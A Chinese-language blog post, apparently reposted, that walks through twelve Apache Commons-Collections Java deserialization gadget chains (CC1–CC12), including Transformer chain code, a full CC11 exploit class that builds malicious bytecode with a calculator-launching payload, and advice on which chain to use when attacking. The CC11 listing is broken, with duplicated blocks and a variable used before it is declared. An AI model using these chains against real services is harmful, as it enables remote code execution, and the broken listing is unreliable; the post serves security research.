**一、Common-collections简介**
==========================

Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。

二、Common-Collections 12个链分析
===========================

![1](https://shs3.b.qianxin.com/butian_public/f9bee6c5293b753f2421c47eb8cfb7e38.jpg)

**1.commons-collections1**
--------------------------

入口及关键点AnnotationInvocationHandler的readO bject以及Lazymap的get方法

<https://paper.seebug.org/1242/#commonscollections-1>

首先看后半段链，关键的一个接口commons collections中有一个Transformer接口，用来类型转换

```php

package org.apache.commons.collections;
public interface Transformer {
    O bject transform(O bject var1);
}

```

后半段链中三个关键类继承了这个接口

- org.apache.commons.collections.functors.InvokerTransformer
- org.apache.commons.collections.functors.ConstantTransformer
- org.apache.commons.collections.functors.ChainedTransformer

后半段链构造如下

```php
ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                  new ConstantTransformer(Runtime.class),
                  new InvokerTransformer("getMethod", new Class[] {
                          String.class, Class[].class }, new O bject[] {
                          "getRuntime", new Class[0] }),
                  new InvokerTransformer("invoke", new Class[] {
                          O bject.class, O bject[].class }, new O bject[] {
                          null, new O bject[0] }),
                  new InvokerTransformer("exec",
                          new Class[] { String.class }, new O bject[]{"open  /System/Applications/Calculator.app"})});
```

最外层是一个ChainedTransformer，参数时一个Transformer数组，其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去，我们传入的Transformer\[\]，也就是下面的this.iTransformers,会遍历这个数组，调用各自的transformer方法

![图片](https://shs3.b.qianxin.com/butian_public/f689a72f830f621df12ccda1399961e85.jpg)

接下来看数组的第一个元素ContstanTransformer，其transform方法将输入原封不动的返回，知道这个后回到cc后半段链的构造代码里，这里的this.iConstant 也就是Runtime.class将会返回，当作InvokerTransformer的transformer方法的执行参数

![图片](https://shs3.b.qianxin.com/butian_public/f964c18ac540a37c8c8bbab2728d582c8.jpg)

最后看InvokeTransformer的transformer方法

![图片](https://shs3.b.qianxin.com/butian_public/ff76a89d2502c4f70f1331d23c3898c01.jpg)

接收了一个O bject，并且以调用O bject的任意方法(通过反射实现)。

```php
Runtime runtime = Runtime.getRuntime();
Transformer invoketransformer = new InvokerTransformer("exec",new Class[]{String.class},new O bject[]{"calc"});
invoketransformer.transform(runtime);

```

因为前面的ChainTranformer以及ConstantTransformer已经将rutime对象构造好了，整条链就串起来了。

![图片](https://shs3.b.qianxin.com/butian_public/f4640d04dce823fb7946c806f71a657cb.jpg)

接下来我们看前半段链

> 目前已经构造到只需要反序列化后调用transform方法，并传递任意内容即可rce。我们的目的是在调用readO bject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readO bject后就调用那是最好的），如果找不到在readO bject里调用transform方法，那么就需要找到一条链，在readO bject触发起点，接着一步步调用到了transform方法。

CC1的前半段是用的LazyMap#get 方法，

![图片](https://shs3.b.qianxin.com/butian_public/f86a26217104e20ddaa6200417cdadc27.jpg)

这里的this.factory可控，在new LazyMap时传入参数即可，通过反射调用此构造函数即可

![图片](https://shs3.b.qianxin.com/butian_public/f5b5fa080c1a21b2492edb6ec95d83753.jpg)

下面就是看那里调用了get方法，CC1是AnnotationInvocationHandler的readO bject

这里this.memberValues是我们可控的

如果这里的this.memberValues是个代理类，那么就会调用this.memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。

![图片](https://shs3.b.qianxin.com/butian_public/fd938c62ae8d93c8d1fc4cda0ca2d771f.jpg)

所以在AnnotationInvocationHandler readO bject时this.memberValues是之前构造好的proxy\_map，由于这是一个代理对象，所以调用其方法时，会去调用其创建代理时设置的handler的invoke方法，

![图片](https://shs3.b.qianxin.com/butian_public/f51448dca64aea10bd85d7ff48e2ba53d.jpg)

invoke方法会触发get方法，反序列化链串起来了

![图片](https://shs3.b.qianxin.com/butian_public/fac81ea0ba7dfb804a5cff3ddecd18428.jpg)

**2.commons-collections2**
--------------------------

关键入口点为PriorityQueue#readO bject

queue\[i\]的值我们可以通过writeO bject可控

![图片](https://shs3.b.qianxin.com/butian_public/fddd8cab9f9199de51f5d64a9078c4e86.jpg)

然后我们的关注点来到heapify()

![图片](https://shs3.b.qianxin.com/butian_public/f47d15eb47e956bb97f53391df8f0d6a1.jpg)

再跟进siftDown x可控

![图片](https://shs3.b.qianxin.com/butian_public/fa09a3ffc5ecccae40bd8207cc494c918.jpg)

然后是siftDownUsingComparator![图片](https://shs3.b.qianxin.com/butian_public/f61694e35307988b616109e286bc18150.jpg)

这里的x是我们可控的，cc2中使用了TransformingComparator#compare来触发后续链

![图片](https://shs3.b.qianxin.com/butian_public/fb4bd2fdfccec3a6e840dbf206f0f1863.jpg)

前半段结束

![图片](https://shs3.b.qianxin.com/butian_public/ff4ec9e180c36be8978a2f3bd0e05f369.jpg)

**3.commons-collections3**
--------------------------

<https://paper.seebug.org/1242/#commons-collections-3>

先直接看下调用链

![图片](https://shs3.b.qianxin.com/butian_public/fdd71b6e82b28aaf05d6c23ed9ec697e7.jpg)

可以看到前面和CC1是一样的InstantiateTransformer.transform()是陌生的，进去看一下

![图片](https://shs3.b.qianxin.com/butian_public/fc990539f847e8b0c4bf8e366d04c5f21.jpg)

CC3 将input设置为TrAXFilter，调用getConstructor时就会调用TrAXFilter的构造方法

![图片](https://shs3.b.qianxin.com/butian_public/fbb47dc53c2d63a7c13152c1923b36dff.jpg)

跟进com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer

![图片](https://shs3.b.qianxin.com/butian_public/fdd7bc81c3e4406b9b94bdbf7c0e489aa.jpg)

newTransformer中调用了getTransletInstance方法

![图片](https://shs3.b.qianxin.com/butian_public/f4439c0bfef4dc6482ecf20adc869ebe8.jpg)

可以通过TemplatesImpl#newTransformer方法来执行恶意类的static语句块

![图片](https://shs3.b.qianxin.com/butian_public/fe1a0393f10856e0463deb0e0be6ebb87.jpg)

**4.commons-collections4**
--------------------------

![图片](https://shs3.b.qianxin.com/butian_public/f128df6f0f8cbd9fcb5f07a5738936956.jpg)

> cc3前半段用的是cc1的，在cc4里稍微改了一下，前半段换成cc2的了

![图片](https://shs3.b.qianxin.com/butian_public/f5b971e478d708df5b1f25cb552f602cf.jpg)

**5.commons-collections5**
--------------------------

cc5的后半段和cc1一样，后半段用到的是TiedMapEntry中的toString方法

![图片](https://shs3.b.qianxin.com/butian_public/f0ccc4a43bed00039ba0ab25e8e19bb6a.jpg)

进入getvalue

![图片](https://shs3.b.qianxin.com/butian_public/f511775f18314778e450ce8c7df81fa6b.jpg)

bingo！跟LazyMap串起来了

**6.commons-collections6**
--------------------------

cc6的后半段链也和cc1是一样的，cc6中则是通过TiedMapEntry#hashCode触发对TiedMapEntry#getValue的调用

![图片](https://shs3.b.qianxin.com/butian_public/ffe3247370816e7ce4501645923930bba.jpg)

![图片](https://shs3.b.qianxin.com/butian_public/f6f2027fdf5c877c5cc889fc5d96be387.jpg)

**7.commons-collections7**
--------------------------

cc7的后半段链也和cc1是一样的，cc7通过AbstractMap#equals来触发对LazyMap#get方法的调用

![图片](https://shs3.b.qianxin.com/butian_public/f1269f25211183772a8b497a8f0c49a79.jpg)

**8.commons-collections8**
--------------------------

看下调用链

![图片](https://shs3.b.qianxin.com/butian_public/fd0dd31457b8e7c1e2e17917641496d6d.jpg)

使用的是HashSet，这里的e我们是可以通过writeO bject可控的

![图片](https://shs3.b.qianxin.com/butian_public/f46e27f62e00f130f217836f045c87be3.jpg)

跟进put，key可控，跟进hash方法

![图片](https://shs3.b.qianxin.com/butian_public/f8788ce26457b8df4ad88892f5e610891.jpg)

这里的k cc8提前设定好为TiedMapEntry跟进其hashCode()方法

![图片](https://shs3.b.qianxin.com/butian_public/f5fd13e72f301af2f63c8940b90d1e745.jpg)

然后就是cc6的前半段

![图片](https://shs3.b.qianxin.com/butian_public/f543ec5ec78d56941c1b0b45b7c84e27c.jpg)

**9.commons-collections9**
--------------------------

梅子酒师傅提交的CommonsCollections9，主要利用的是CommonsCollections:3.2版本新增的DefaultedMap来代替LazyMap，因为这两个Map有同样的get函数可以被利用

10.commons-collections10
------------------------

后半部分与CC6类似，利用链如下

```php

Hashtable.readO bject()
    -> Hashtable.reconstitutionPut
    -> key.hashCode() => TiedMapEntry.hashCode()
    -> TiedMapEntry.getValue
    -> TiedMapEntry.map.get() => LazyMap.get()
    -> factory.transform() => ChainedTransformer.transform()
    -> 前文构造的Runtime.getRuntime().exec()

```

**11.commons-collections11**
----------------------------

前半段CC2 后半段CC6

![图片](https://shs3.b.qianxin.com/butian_public/fef6c8647b450357ea4c552c53a9aeba6.jpg)

谢谢@天下大木头的代码，之前cc11没存

```php
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.O bjectInputStream;
import java.io.O bjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class cc11 {
    public static void main(String[] args) throws Exception {

        // 利用javasist动态创建恶意字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错

        // 写入.class 文件
        // 将我的恶意类转成字节码，并且反射设置 bytecodes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");
        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new O bject[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        O bject node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        O bject[] array = (O bject[])f2.get(hashset_map);

        O bject node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
            O bjectOutputStream outputStream = new O bjectOutputStream(new FileOutputStream("./cc11"));
            outputStream.writeO bject(hashset);
            outputStream.close();

            O bjectInputStream inputStream = new O bjectInputStream(new FileInputStream("./cc11"));
            inputStream.readO bject();
        }catch(Exception e){
            e.printStackTrace();
```

**12.commons-collections12**
----------------------------

清水老板的，与CC6的区别就是引入了js来支持执行更多命令，主要修改了transformer的构造

```php

String[] execArgs = new String[]{cmd};
      Transformer[] transformers = new Transformer[]{new ConstantTransformer(S criptEngineManager.class),
              new InvokerTransformer("newInstance", new Class[0], new O bject[0]),
              new InvokerTransformer("getEngineByName", new Class[]{String.class},
                      new O bject[]{"J avaS cript"}), new InvokerTransformer("e val",
              new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
```

详情见https://xz.aliyun.com/t/8673

**三、汇总**
========

![图片](https://shs3.b.qianxin.com/butian_public/f9bee6c5293b753f2421c47eb8cfb7e38.jpg)

**1.一些参考结论**
------------

CommonsCollections1 commons-collections:3.1

CommonsCollections1,3,5,6,7,10用的还是commons-collections:3.1

CommonsCollections9 适用于3.2.1

CommonsCollections2,4,8，其利用链基于CommonsCollections:4.0版本

CommonsCollections11 适用于CommonsCollections:3.1-3.2.1 JDK版本：暂无限制

**2.自己的一些测试**
-------------

关于哪个CC链条最通用 弄了个Demo项目，做了不完全测试，

![图片](https://shs3.b.qianxin.com/butian_public/fedaba666363ee5b3ed9b0df8fa179051.jpg)

最终结果如下：

![图片](https://shs3.b.qianxin.com/butian_public/f9899374c0a7105a4b5ffe928cacfb06c.jpg)

CommonsCollections11 适用于CommonsCollections:3.1-3.2.1 JDK版本：暂无限制

最后，据不完全统计推荐打CC的时候，

建议本地使用JDK7 commons-collections4-4.0 分别用CC4、CC3生成两个版本

建议本地使用JDK7 commons-collections3.1 用CC10或者CC11生成payload 3.\* 都可以打

**3.勿喷**
--------

**我这里并没有测试全部的CC链，结论可能有问题，以后跟CC的师傅欢迎做个更全面的测试**

**四、参考链接**
==========

- - - - - -

<https://paper.seebug.org/1242/>

<https://paper.seebug.org/1251/>

[https://mp.weixin.qq.com/s/6CdsdPOl4bF2oZLiW3pt9Q](https://mp.weixin.qq.com/s?__biz=MzIyMjQwMTgyNA==&mid=2247483912&idx=1&sn=94e3c520c96a20346974ea498bc5b03a&scene=21#wechat_redirect)

<https://www.anquanke.com/post/id/190468#h3-9>

<http://wjlshare.com/archives/1536>

<https://xz.aliyun.com/t/8673>

文章首发于赛博少女公众号，已授权转载